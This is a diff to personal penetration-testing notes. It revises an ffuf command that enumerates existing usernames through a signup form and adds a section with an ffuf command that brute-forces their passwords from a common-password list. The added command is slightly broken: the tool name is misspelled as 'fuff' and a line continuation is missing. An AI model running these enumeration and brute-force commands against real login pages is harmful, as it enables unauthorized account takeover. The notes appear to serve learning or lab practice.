@@ -75,13 +75,25 @@ It allows you to gather detailed information about a target's network without ac
 This can be done in a signup page to check the usernames that already exist
 you run the command 
 ```
-ffuf -w /usr/share/wordlists/Seclists/Usernames/Names/names.txt \
+ffuf -w /usr/share/seclists/Usernames/Names/names.txt  \
      -X POST \
      -d "username=FUZZ&email=x&password=x&cpassword=x" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -u URL \
      -mr "username already exists"
 ```
+### Bruteforcing 
+After finding valid usernames you can create a file and store those usernames ie valid_usernames.txt and run this command to bruteforce their passwords
+```
+fuff -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
+-X POST \
+-d "username=W1&password=W2" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-u URL
+-fc 200
+```
+by doing this you ca find a match
+
 
 
 
